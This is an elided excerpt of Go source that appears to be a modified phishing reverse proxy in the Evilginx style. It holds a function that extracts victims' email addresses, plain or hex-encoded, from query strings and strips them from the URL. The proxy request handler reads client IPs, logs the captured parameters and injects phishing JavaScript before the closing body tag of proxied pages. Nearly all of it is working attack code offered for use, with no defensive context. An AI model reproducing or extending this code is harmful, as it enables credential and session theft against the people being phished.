...
// fubnctions to strip username from query string to capture defined query tag on phishlet

func (p *HttpProxy) PhisUserInput(u *url.URL) (map[string]string, *url.URL) { //addd this function

    triger_pams_key := []string{}
    js_params := map[string]string{}

    urlrequested := u.String()
    urlpass, _ := url.Parse(u.String())

    var UserinputQueryString = []string{"userinputemail", "userinputhex"} //THE query strings must be in lowercase

    //SEARCHPARAMS:
    for _, ph := range p.cfg.phishlets {
        for _, js := range ph.js_inject {
            for _, h := range js.trigger_domains {
                if h == strings.ToLower(urlpass.Host) || h == "*" {
                    for _, p_re := range js.trigger_paths {
                        if p_re.MatchString(urlpass.Path) {
                            //triger_pams_key = js.trigger_params
                            triger_pams_key = append(triger_pams_key, js.trigger_params...)
                            //break SEARCHPARAMS
                        }
                    }
    ...
    for _, vv := range append(UserinputQueryString, triger_pams_key...) {

        //this will match query string encoded in hex or rawurlencode
        matchhex, _ := regexp.MatchString("(?i)("+vv+"=[0-9a-fA-F]+)|("+vv+"=[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+(@|%40)[a-z0-9-]+(\\.[a-z0-9-]+)*(\\.[a-z]{2,4}))", urlrequested)

        if matchhex {

            ad, _ := url.Parse(urlrequested)
            uk, _ := url.Parse("../?" + strings.Trim(ad.Path, "/"))
            basek, _ := url.Parse(urlrequested)
            u, _ := url.Parse(fmt.Sprintf("%v", basek.ResolveReference(uk)))
            q, _ := url.ParseQuery(u.RawQuery)

            userinputEmail := ""

            if bs, err := hex.DecodeString(q.Get(vv)); err == nil {

                userinputEmail = string(bs)
            } else {
                userinputEmail = q.Get(vv)
            }

            js_params[vv] = userinputEmail

            rep := regexp.MustCompile("(?i)(&|\\?)?(" + vv + "=[0-9a-fA-F]+|" + vv + "=.*&?)")
            up, _ := url.Parse(rep.ReplaceAllString(urlrequested, ""))

            urlrequested = up.String()
            urlpass = up
...
func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool, livefeed bool) (*HttpProxy, error) {
    ...
    p.Proxy.OnRequest().
        DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
            ...
            // HANDLE DEFINED VARIABLE ON QUERY STRING
            myparams, removeinputurl := p.PhisUserInput(req.URL)
            updatedurl, _ := url.Parse(removeinputurl.String())
            ...
            // HANDLE bad ip capture
            remote_addr := req.RemoteAddr

            if strings.Contains(remote_addr, ":") {
                remote_addr = strings.Split(remote_addr, ":")[0]
                remote_addr = strings.Trim(remote_addr, "[")
                if remote_addr == "" {
                    remote_addr = req.Header.Get("X-Forwarded-For")
                    if strings.Contains(remote_addr, ",") {
                        remote_addr = strings.Split(remote_addr, ",")[len(strings.Split(remote_addr, ","))-1]
                        remote_addr = strings.Trim(remote_addr, ",")
                    }
                    ...
                    if err != nil { // && !p.isWhitelistedIP(remote_addr) {
                        if !p.cfg.IsSiteHidden(pl_name) {
                            ...
                            if l != nil || vv == p.cfg.verificationToken {
                                ...
                                for kk, vv := range myparams {
                                    log.Debug("setting param: %s='%s'", kk, vv)
                                    // fmt.Println("setting param: %s='%s'", kk, vv)
                    ...
                    if pl != nil && ps.SessionId != "" {
                        ...
                        if ok {
                            ...
                            if err == nil {
                                ...
                                re := regexp.MustCompile(`(?i)(<\s*/body\s*>)`) //lookforthis line

                                if re.MatchString(string(body)) {
                                    body = []byte(re.ReplaceAllString(string(body), "<script"+js_nonce+">{PHISHER_MAIN_JS_PLACE_HOLDER}</script>${1}"))
                                    safeJS_replace := strings.Replace(string(body), "{PHISHER_MAIN_JS_PLACE_HOLDER}", script, -1)
                                    body = []byte(safeJS_replace)
                                }
                            }
                        }
                    }
